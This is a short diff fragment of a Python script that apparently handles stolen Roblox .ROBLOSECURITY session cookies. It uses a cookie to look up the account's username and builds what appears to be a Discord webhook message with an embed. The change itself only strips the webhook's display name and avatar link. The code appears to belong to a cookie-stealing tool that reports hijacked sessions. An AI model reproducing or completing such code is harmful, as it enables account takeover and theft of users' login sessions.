@@ -42,8 +42,7 @@ for i in range(9999):
             username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
             data = {
                 "content" : ping,
-                "username" : "kunai;",
-                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
+               
             }
             data["embeds"] = [
                 {
